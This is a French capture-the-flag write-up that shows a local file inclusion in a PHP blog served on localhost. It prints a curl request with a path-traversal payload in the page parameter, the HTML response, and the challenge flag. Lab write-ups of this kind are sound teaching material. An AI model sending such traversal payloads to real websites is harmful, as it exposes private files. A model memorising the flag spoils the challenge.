# File Quest

## Local File Inclusion
En allant sur la page donner dans le chall, nous voyons que c'est un blog sur la tech tenu par l'ESGI. Nous pouvons remarqué 3 blogs, 1 sur la cybersécurité, 1 sur le DevOps et un 1 sur la Data Science. 
Pour commencer nous pouvons aller checké un article, prenons celui sur la cybersécurité. 

Okay, c'est une page classique, mais le lien m'intéresse : 
```
http://localhost:5082/article.php?page=cybersecurite
``` 

Nous pouvons tester de mettre un fichier au hasard dans le paramètre ``page=``. Nous essayons de passer sur un autre article, nous injectons ``data-science`` et la nous avons l'article data-science. 

Nous avons l'information que notre flag ce trouve au même niveau que le dossier ``html``. Nous pouvons donc injecter noter chemin : 
```
curl "http://localhost:5082/article.php?page=../../../../../var/flag"                                                                                                                                                                        ─╯
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Article - ESGI Blog</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <header>
        <div class="container">
            <h1>🎓 ESGI TECH BLOG</h1>
            <p class="subtitle"><a href="index.php" style="color: white;">← Retour à l'accueil</a></p>
        </div>
    </header>

    <main class="container">
        <article class="article-content">
            <div class='article-text'>SKL{L0c4L_F1L3_1nCLu5i0n_-_}

</div>        </article>
    </main>

</body>
</html>
```

Nous pouvons voir le flag : ``SKL{L0c4L_F1L3_1nCLu5i0n_-_}``
